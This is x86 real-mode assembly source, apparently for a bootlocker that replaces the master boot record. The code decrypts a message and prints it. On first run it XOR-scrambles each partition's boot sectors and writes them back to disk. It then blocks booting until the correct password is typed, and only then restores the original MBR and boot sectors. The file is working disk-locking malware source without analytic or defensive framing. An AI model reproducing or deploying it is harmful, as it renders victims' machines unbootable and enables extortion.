assume cs:code

code segment
start:	
	
	;加载关键数据至内存
	mov ax,20h
	mov ds,ax
	xor si,si
	mov ax,800h
	mov es,ax
	xor bx,bx
	mov cx,1
	mov ah,42h
	mov di,7c00h+offset DataPos+8
	call PutSec
	
	mov bh,2h
	mov cl,1
	mov di,7c00h+offset DataPos
	call PutSec
	
	mov bh,4h
	mov cl,1
	mov di,7c00h+offset DataPos+16
	call PutSec
	
	;8000h->pwd and print text
	;8200h->old mbr
	;8400h->DBR pos Array
	
	mov cx,479
Loop_XorText:
	xor byte ptr es:[si+33],0A0h;解密显示文本
	inc si
	loop Loop_XorText
	
	xor si,si
loop_GetPrintTextSize:
	mov al,es:[21h+si]
	inc si
	test al,al
	jne loop_GetPrintTextSize
	
	dec si
	mov cx,si
	xor ax,ax
	;mov es,ax
	mov bp,21h
	mov ax,01301h
	xor bh,bh
	mov bl,00000111b
	xor dx,dx
	int 10h

	;第一次运行时加密DBR
	xor cx,cx
	mov cl,cs:7c00h[DiskCount]
	xor bx,bx
	xor si,si
s0:
	push cx
	mov ah,42h
	mov di,8400h
	add di,si
	mov bx,1000h
	mov cl,10h
	call PutSec
	test si,si
	jne con
	cmp byte ptr cs:9000h,0EBh;判断是否被加密过;EBh为存根,用于验证是否第一次加密
	jne _st
con:;加密DBR
	mov cx,2000h
	mov di,9000h
	call XorSrc
	
	mov bx,1000h
	mov ah,43h
	mov di,8400h
	add di,si
	mov cx,10h
	call PutSec
	
	add si,8
	pop cx
	loop s0
	
_st:
	push es
	mov ax,0b8a0h
	mov es,ax
Re:	
	xor si,si
getCode:
	xor ax,ax
	int 16h
	mov bx,si
	add bx,bx
	cmp ah,0Eh
	je short DeleteCode
	cmp ah,01Ch
	je short EnterCode
PrintCode:
	mov es:[bx],al
	mov byte ptr es:[bx+1],00001010b
	mov [si],al
	inc si
	jmp short getCode
DeleteCode:
	test bx,bx
	je getCode
	sub bx,2
	mov word ptr es:[bx],0
	dec si
	jmp short getCode
EnterCode:
	mov cx,si
	xor ax,ax
	mov al,byte ptr cs:8000h
	sub al,0A3h;root3
	xor al,0A2h;root2
	cmp si,ax
	jne short ClearCode
	xor si,si
s:	mov al,byte ptr [si]
	xor al,0A2h;root2
	add al,0A3h;root3
	xor al,cs:[8001h+si]
	test al,al
	jne ClearCode
	inc si
	loop s
	jmp EndCode
ClearCode:	
	mov cx,bx
s1: mov byte ptr es:[bx],00
	dec bx
	loop s1
	jmp Re
	
EndCode:;还原MBR及DBR
	pop es
	mov ax,900h
	mov es,ax
	xor cx,cx
	mov cl,cs:7c00h[DiskCount]
	xor si,si
s2:
	push cx
	mov ah,42h
	mov di,8400h
	add di,si
	xor bx,bx
	mov cl,10h
	call PutSec
	
	mov cx,2000h
	mov di,9000h
	call XorSrc
	
	mov ah,43h
	mov cx,10h
	mov di,8400h
	add di,si
	call PutSec
	
	add si,8
	pop cx
	loop s2
	
	mov cx,2000h
	mov di,8200h
	call XorSrc
	
	mov ax,820h
	mov es,ax
	xor bx,bx
	mov ax,0301h
	mov cx,1
	mov dx,0080h
	int 13h
	
	mov ax,-1
	push ax
	xor ax,ax
	push ax
	retf
XorSrc:;cs:di指向要解密数据的地址,cx为长度,si为es的计数器
	push bx
	xor bx,bx
s3:
	xor byte ptr cs:[di+bx],20h;20h为存根
	inc bx
	loop s3
	pop bx
	ret
	
	
PutSec:;42h=read,43h=write cs:di:offset of disk info ds:si->buffer of DAG es:bx->buffer cx:CountOfSection
	push di
	push ax
	mov byte ptr [si],10h
	mov byte ptr [si+1],0h
	mov word ptr [si+2],cx
	mov word ptr [si+4],bx
	push es
	pop word ptr [si+6]
	push bx
	xor bx,bx
	mov cl,8
put:
	mov al,cs:[di+bx]
	mov byte ptr [si+8+bx],al
	inc bx
	loop put
	push si
	mov dl,80h
	int 13h
	pop si
	pop bx
	pop ax
	pop di
	ret
	
text:
	DiskCount db 1 
	DataPos dq 2,3,4;pos=原MBR(加密后),pos+1=密码和显示字符串,pos+2=DBR偏移表
	
code ends
end start
